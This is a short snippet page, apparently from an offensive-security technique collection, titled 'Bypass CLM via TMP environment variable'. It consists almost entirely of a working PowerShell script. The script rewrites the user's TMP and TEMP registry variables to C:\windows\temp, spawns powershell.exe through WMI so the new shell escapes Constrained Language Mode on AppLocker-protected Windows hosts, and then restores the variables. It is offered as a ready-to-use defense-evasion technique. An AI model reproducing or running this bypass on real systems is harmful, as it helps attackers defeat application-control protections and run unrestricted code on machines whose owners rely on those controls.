---
title: "Bypass CLM via TMP environment variable"
author: sorahed
date: 2026-04-12
tags: [windows, applocker, defense-evasion]
description: "Sidestep Constrained Language Mode on AppLocker-protected hosts by pointing $env:TMP to a writable path before spawning PowerShell."
---

```powershell
$CurrTemp = $env:temp
$CurrTmp  = $env:tmp
$BypassPath = "C:\windows\temp"

Set-ItemProperty -Path 'HKCU:\Environment' -Name Tmp  -Value $BypassPath
Set-ItemProperty -Path 'HKCU:\Environment' -Name Temp -Value $BypassPath

Invoke-WmiMethod -Class win32_process -Name create -ArgumentList "powershell.exe"
Start-Sleep 5

# restore
Set-ItemProperty -Path 'HKCU:\Environment' -Name Tmp  -Value $CurrTmp
Set-ItemProperty -Path 'HKCU:\Environment' -Name Temp -Value $CurrTemp
```
